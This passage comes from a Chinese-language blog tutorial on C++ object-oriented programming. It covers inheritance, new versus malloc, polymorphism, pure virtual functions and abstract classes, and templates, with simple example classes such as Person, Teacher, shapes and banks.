<p>5.编译器不要求必须提供</p>
<h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>有一个Teacher类，一个Person类。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">int</span> age;</span><br><span class="line">	<span class="type">int</span> gender;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Teacher</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">int</span> age;</span><br><span class="line">	<span class="type">int</span> gender;</span><br><span class="line">	<span class="type">int</span> level;</span><br><span class="line">	<span class="type">int</span> teacherID;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现Teacher类中有两个和Person类中是一样的，为了减少代码的重复，可以让Teacher继承Person的一些性质（age、gender）。也就是：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Teacher</span>:</span>Person</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> level;</span><br><span class="line">	<span class="type">int</span> teacherID;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里，Person类称为父类或基类；Teacher类称为子类或者派生类</p>
<p><strong>但是，</strong>当父类和子类中有相同的数据时，比如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">int</span> age;</span><br><span class="line">	<span class="type">int</span> gender;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Teacher</span>:</span>Person</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> age;</span><br><span class="line">	<span class="type">int</span> level;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当Teacher类继承了Person类时，其中的age重复了，但是编译器仍然会给这两个age都开辟空间</p>
<p>当使用时：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	Teacher t;</span><br><span class="line">	t.Person::age = <span class="number">20</span>;			<span class="comment">//这里就是父类Person类中的age</span></span><br><span class="line">	t.age = <span class="number">25</span>;					<span class="comment">//这里就是子类Teacher类中的age</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>继承不仅限于父类</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">X</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">int</span> a;</span><br><span class="line">	<span class="type">int</span> b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Y</span>:</span>X</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> c;</span><br><span class="line">	<span class="type">int</span> d;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">z</span>:</span>Y</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> e;</span><br><span class="line">	<span class="type">int</span> f;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当使用时，Z类中能够继承到所有的a,b,c,d</p>
<p><strong>多重继承</strong></p>
<p>与上面类似：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Z</span>:</span>X,Y</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> e;</span><br><span class="line">	<span class="type">int</span> f;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多重继承增加了程序的复杂度，不建议使用。</p>
<h2 id="在堆中创建对象"><a href="#在堆中创建对象" class="headerlink" title="在堆中创建对象"></a>在堆中创建对象</h2><p>堆中创建对象的两种方式：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Person* p = (Person*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Person)*<span class="number">10</span>);</span><br><span class="line">Person* p = new Person[<span class="number">10</span>];</span><br></pre></td></tr></table></figure>

<p>释放对象占用内存对应的两种方式：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line">delete[] p;</span><br></pre></td></tr></table></figure>

<p>当使用malloc函数分配空间时，创建对象后不会调用构造函数，使用free()函数后也不会调用析构函数。</p>
<p>当使用new关键字创建对象时，会调用构造函数，并在使用delete释放对象占用内存时会调用析构函数。</p>
<h2 id="面向对象程序设计之封装和继承"><a href="#面向对象程序设计之封装和继承" class="headerlink" title="面向对象程序设计之封装和继承"></a>面向对象程序设计之封装和继承</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:26495)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">private:</span><br><span class="line">    <span class="type">int</span> Age;</span><br><span class="line">    <span class="type">int</span> Gender;</span><br><span class="line">public:</span><br><span class="line">    Person()</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    Person(<span class="type">int</span> Age, <span class="type">int</span> Gender)</span><br><span class="line">    &#123;</span><br><span class="line">        this-&gt;Age = Age;</span><br><span class="line">        this-&gt;Gender = Gender;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// public method</span></span><br><span class="line">    	<span class="comment">// Age</span></span><br><span class="line">    <span class="type">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> Age)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (Age &lt;= <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            this-&gt;Age = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            this-&gt;Age = Age;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> this-&gt;Age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    	<span class="comment">//Gender</span></span><br><span class="line">    <span class="type">void</span> <span class="title function_">setGender</span><span class="params">(<span class="type">int</span> Gender)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (Gender &lt;= <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            this-&gt;Gender = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            this-&gt;Gender = Gender;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">getGender</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> this-&gt;Gender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Teacher</span>:</span>public Person</span><br><span class="line">&#123;</span><br><span class="line">private:</span><br><span class="line">    <span class="type">int</span> Level;</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line">    Teacher()</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    Teacher(<span class="type">int</span> Level, <span class="type">int</span> Age, <span class="type">int</span> Gender):Person(Age, Gender)		 <span class="comment">// 这里如果不在后面加::Person()的话，程序默认会调用Person类中的无参构造函数。</span></span><br><span class="line">    &#123;</span><br><span class="line">        this-&gt;Level = Level;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// public method</span></span><br><span class="line">    	<span class="comment">// Level</span></span><br><span class="line">    <span class="type">void</span> <span class="title function_">setLevel</span><span class="params">(<span class="type">int</span> Level)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (Level &lt;= <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            this-&gt;Level = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            this-&gt;Level = Level;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">getLevel</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> this-&gt;Level;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 创建Teacher对象并传入三个参数</span></span><br><span class="line">    Teacher* A = new Teacher(<span class="number">5</span>, <span class="number">20</span>, <span class="number">1</span>);</span><br><span class="line">    Teacher* B = new Teacher(<span class="number">4</span>, <span class="number">22</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;A =&gt; Age:%d,Level:%d,Gender:%d\n&quot;</span>, A-&gt;getAge(), A-&gt;getLevel(), A-&gt;getGender()); <span class="comment">// 使用get方法获取</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;B =&gt; Age:%d,Level:%d,Gender:%d\n&quot;</span>, B-&gt;getAge(), B-&gt;getLevel(), B-&gt;getGender());</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 使用Teacher中的方法和继承的Person中的方法修改对象A和对象B中的数据</span></span><br><span class="line">    A-&gt;setAge(<span class="number">50</span>);</span><br><span class="line">    A-&gt;setLevel(<span class="number">8</span>);</span><br><span class="line">    B-&gt;setAge(<span class="number">45</span>);</span><br><span class="line">    B-&gt;setLevel(<span class="number">9</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;A =&gt; Age:%d,Level:%d,Gender:%d\n&quot;</span>, A-&gt;getAge(), A-&gt;getLevel(), A-&gt;getGender());</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;B =&gt; Age:%d,Level:%d,Gender:%d\n&quot;</span>, B-&gt;getAge(), B-&gt;getLevel(), B-&gt;getGender());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A =&gt; Age:20,Level:5,Gender:1</span><br><span class="line">B =&gt; Age:22,Level:4,Gender:0</span><br><span class="line"></span><br><span class="line">A =&gt; Age:50,Level:8,Gender:1</span><br><span class="line">B =&gt; Age:45,Level:9,Gender:0</span><br></pre></td></tr></table></figure>

<h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Square</span>		//这是一个抽象类，抽象类不能创建对象</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line">    virtual <span class="type">float</span> <span class="title function_">CalcSq</span><span class="params">()</span> = <span class="number">0</span>;		<span class="comment">//因为不同的图形有不同的求面积方式，所以这里仅定义一个纯虚函数，然后由子类中重写这个函数</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Circle</span> :</span> public Square		<span class="comment">//继承抽象类</span></span><br><span class="line">&#123;</span><br><span class="line">private:</span><br><span class="line">    <span class="type">float</span> r;</span><br><span class="line">public:</span><br><span class="line">    Circle(<span class="type">float</span> r)</span><br><span class="line">    &#123;</span><br><span class="line">        this-&gt;r = r;</span><br><span class="line">    &#125;</span><br><span class="line">    virtual <span class="type">float</span> <span class="title function_">CalcSq</span><span class="params">()</span>			<span class="comment">//重写，这一行必须要和父类中的一样</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">3.14</span> * r * r;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rectangle</span> :</span> public Square</span><br><span class="line">&#123;</span><br><span class="line">private:</span><br><span class="line">    <span class="type">float</span> x, y;</span><br><span class="line">public:</span><br><span class="line">    Rectangle(<span class="type">float</span> x, <span class="type">float</span> y)</span><br><span class="line">    &#123;</span><br><span class="line">        this-&gt;x = x;</span><br><span class="line">        this-&gt;y = y;</span><br><span class="line">    &#125;</span><br><span class="line">    virtual <span class="type">float</span> <span class="title function_">CalcSq</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> x * y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">float</span> <span class="title function_">CalcSq</span><span class="params">(Square* S)</span>			<span class="comment">//这里传递父类指针</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> S-&gt;CalcSq();			<span class="comment">//父类指针可指向子类		////这里体现了多态性</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    Circle <span class="title function_">C</span><span class="params">(<span class="number">2.5</span>)</span>;				<span class="comment">//创建一个对象，参数传递r=2.5</span></span><br><span class="line">    Rectangle <span class="title function_">R</span><span class="params">(<span class="number">4.5</span>, <span class="number">10</span>)</span>;·		<span class="comment">//创建一个对象,参数传递x=4.5,y=10</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Circle:\t\t%f\n&quot;</span>, CalcSq(&amp;C));<span class="comment">//调用函数求面积，函数中传递子类的指针，因为float CalcSq(Square* S)，其中传递的父类指针可以指向子类地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Rectangle:\t%f\n&quot;</span>, CalcSq(&amp;R));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="虚函数"><a href="#虚函数" class="headerlink" title="虚函数"></a>虚函数</h3><p><code>&lt;1&gt;</code>虚函数目的是提供一个统一的接口，被继承的子类重载，以多态的形式被调用。<br><code>&lt;2&gt;</code>如果基类中的函数没有任何实现的意义，那么可以定义成纯虚函数：virtual返回类型函数名（参数列表）&#x3D;0；<br><code>&lt;3&gt;</code>含有纯虚函数的类被称为抽象类(abstract class),不能创建对象。<br><code>&lt;4&gt;</code>虚函数可以被直接使用，也可以被子类(sub class)重载以后以多态的形式调用，而纯虚函数必须在子类(sub class)中实现该函数才可以使用。</p>
<h2 id="运算符重载"><a href="#运算符重载" class="headerlink" title="运算符重载"></a>运算符重载</h2><p><img src="/2024/02/28/c-1/image-20240228230826536.png" alt="image-20240228230826536"></p>
<p>运算符重载也就是给之前的运算符重新起个名字，比如重载一个<code>++</code>，使它被使用时一次+5</p>
<p>当然，这个重载仅在这个类中有用，原本的<code>++</code>还是自增1</p>
<h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><p>使用<code>template &lt;class T&gt;</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">template &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">BubbleSort</span><span class="params">(T arr[], <span class="type">int</span> length)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="type">int</span> j;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; length - i - <span class="number">1</span>; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (arr[j]&gt;arr[j+<span class="number">1</span>])</span><br><span class="line">			&#123;</span><br><span class="line">				T temp = arr[j];</span><br><span class="line">				arr[j] = arr[j + <span class="number">1</span>];</span><br><span class="line">				arr[j + <span class="number">1</span>] = temp;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> arr1[] = &#123; <span class="number">5</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">9</span> &#125;;</span><br><span class="line">	<span class="type">float</span> arr2[] = &#123; <span class="number">5.2</span>,<span class="number">1.1</span>,<span class="number">3.6</span>,<span class="number">2.5</span>,<span class="number">4.9</span>,<span class="number">8.0</span>,<span class="number">9.4</span>,<span class="number">1.52</span>,<span class="number">7.7</span>,<span class="number">8.2</span>,<span class="number">5.9</span>,<span class="number">10.4</span>,<span class="number">6.012</span>,<span class="number">9.5</span> &#125;;</span><br><span class="line">	BubbleSort&lt;<span class="type">int</span>&gt;(arr1, <span class="keyword">sizeof</span>(arr1)/<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">	BubbleSort&lt;<span class="type">float</span>&gt;(arr2, <span class="keyword">sizeof</span>(arr2)/<span class="keyword">sizeof</span>(<span class="type">float</span>));</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当程序同为冒泡排序，只是数组的数据类型不同时，可以使用模板替换其中的一部分。</p>
<p>模板可以替换各种类型。如果类型时自己定义的，比如定义一个Number类，要给Number类中的成员进行冒泡排序，则需要先运算符重载，使<code>&gt;</code>可以比较Number中成员的大小。</p>
<p>案例：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">template &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">BubbleSort</span><span class="params">(T arr[], <span class="type">int</span> length)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; length - i - <span class="number">1</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                T temp = arr[j];</span><br><span class="line">                arr[j] = arr[j + <span class="number">1</span>];</span><br><span class="line">                arr[j + <span class="number">1</span>] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Number</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">private:</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line">    Number(<span class="type">int</span> x)</span><br><span class="line">    &#123;</span><br><span class="line">        this-&gt;x = x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> operator&gt;(Number&amp; num)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> this-&gt;x &gt; num.x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> arr1[] = &#123; <span class="number">5</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">9</span> &#125;;</span><br><span class="line">    BubbleSort&lt;<span class="type">int</span>&gt;(arr1, <span class="keyword">sizeof</span>(arr1) / <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">    Number arr2[] = &#123; Number(<span class="number">5</span>), Number(<span class="number">1</span>), Number(<span class="number">3</span>), Number(<span class="number">2</span>), Number(<span class="number">4</span>), Number(<span class="number">8</span>), Number(<span class="number">9</span>), Number(<span class="number">12</span>), Number(<span class="number">7</span>), Number(<span class="number">8</span>), Number(<span class="number">5</span>), Number(<span class="number">10</span>), Number(<span class="number">6</span>), Number(<span class="number">2</span>), Number(<span class="number">9</span>) &#125;;</span><br><span class="line">    BubbleSort&lt;Number&gt;(arr2, <span class="keyword">sizeof</span>(arr2) / <span class="keyword">sizeof</span>(Number));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="纯虚函数"><a href="#纯虚函数" class="headerlink" title="纯虚函数"></a>纯虚函数</h2><h3 id="什么是纯虚函数"><a href="#什么是纯虚函数" class="headerlink" title="什么是纯虚函数"></a>什么是纯虚函数</h3><p>&lt; 1 &gt; 将成员函数声明为virtual</p>
<p>&lt; 2 &gt;该函数没有函数体（后跟&#x3D;0）</p>
<p>如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CBank</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line">	virtual <span class="title function_">double</span><span class="params">(返回值)</span> <span class="title function_">GetAnnualRate</span><span class="params">(函数名)</span><span class="params">()</span><span class="params">(参数列表)</span> = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h3><p>&lt; 1 &gt;含有纯虚函数的类，称为抽象类（Abstract Class）</p>
<p>&lt; 2 &gt;抽象类也可以包含普通成员函数</p>
<p>&lt; 3 &gt;抽象类不能实例化</p>
<p>如使用以下方式定义一个对象：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CBank bank;						<span class="comment">//全局区	栈</span></span><br><span class="line">CBank* pBank = new CBank;		<span class="comment">//堆</span></span><br></pre></td></tr></table></figure>

<p>此时编译器会报错<code>cannot instantiate abstract class due to folowing members(无法实例化一个抽象类)</code></p>
<p>纯虚函数导致了抽象类的存在，抽象类则可以定义规范、定义一些规则<br>比如以下案例：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 银行年利率</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CBank</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line">	virtual <span class="type">double</span> <span class="title function_">GetAnnualRate</span><span class="params">()</span> = <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 中国工商银行</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ICBCBank</span> :</span>public CBank</span><br><span class="line">&#123;</span><br><span class="line">private:</span><br><span class="line">	<span class="type">double</span> m_dPrincipal;</span><br><span class="line">public:</span><br><span class="line">	ICBCBank(<span class="type">double</span> dPrincipal)</span><br><span class="line">	&#123;</span><br><span class="line">		m_dPrincipal = dPrincipal;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">double</span> <span class="title function_">GetAnnualRate</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0.010</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">double</span> <span class="title function_">GetTotalMoney</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> m_dPrincipal + m_dPrincipal * GetAnnualRate();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 中国建设银行</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CCBank</span> :</span>public CBank</span><br><span class="line">&#123;</span><br><span class="line">private:</span><br><span class="line">	<span class="type">double</span> m_dPrincipal;</span><br><span class="line">public:</span><br><span class="line">	CCBank(<span class="type">double</span> dPrincipal)</span><br><span class="line">	&#123;</span><br><span class="line">		m_dPrincipal = dPrincipal;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">double</span> <span class="title function_">GetAnnualRate</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0.015</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">double</span> <span class="title function_">GetTotalMoney</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> m_dPrincipal + m_dPrincipal * GetAnnualRate();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ShowAnnualRate</span><span class="params">(CBank* pBank[], DWORD nLength)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nLength; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%.5lf \n&quot;</span>, pBank[i]-&gt;GetAnnualRate());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	ICBCBank <span class="title function_">icbc</span><span class="params">(<span class="number">10000.0</span>)</span>;</span><br><span class="line">	<span class="type">double</span> dMoney1 = icbc.GetTotalMoney();</span><br><span class="line">	CCBank <span class="title function_">ccb</span><span class="params">(<span class="number">10000.0</span>)</span>;</span><br><span class="line">	<span class="type">double</span> dMoney2 = ccb.GetTotalMoney();</span><br><span class="line"></span><br><span class="line">	CBank* pBank[] = &#123; &amp;icbc,&amp;ccb &#125;;</span><br><span class="line">	ShowAnnualRate(pBank, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这个案例中，银行都继承了CBank这个抽象类，这个抽象类中的纯虚函数定义了子类应该如何获取年利率，因此子类需要重写这个函数。</p>
<p>而它存在的意义就是，当我们需要获取所有的银行的年利率时，有一个这样统一的规范可以将所有银行的年利率统一起来，使用<code>void ShowAnnualRate(CBank* pBank[], DWORD nLength)</code>来让父类指向子类。</p>
<p>这都是站在使用的角度来说。</p>
<h2 id="对象拷贝-拷贝构造函数"><a href="#对象拷贝-拷贝构造函数" class="headerlink" title="对象拷贝-拷贝构造函数"></a>对象拷贝-拷贝构造函数</h2><h3 id="拷贝构造函数"><a href="#拷贝构造函数" class="headerlink" title="拷贝构造函数"></a>拷贝构造函数</h3><img src="/2024/02/28/c-1/image-20240229083940206.png" alt="image-20240229083940206" style="zoom: 67%;">

<p>拷贝构造函数时，如果子类有继承的父类对象，父类也会被继承过来</p>
<img src="/2024/02/28/c-1/image-20240229085147294.png" alt="image-20240229085147294" style="zoom:67%;">

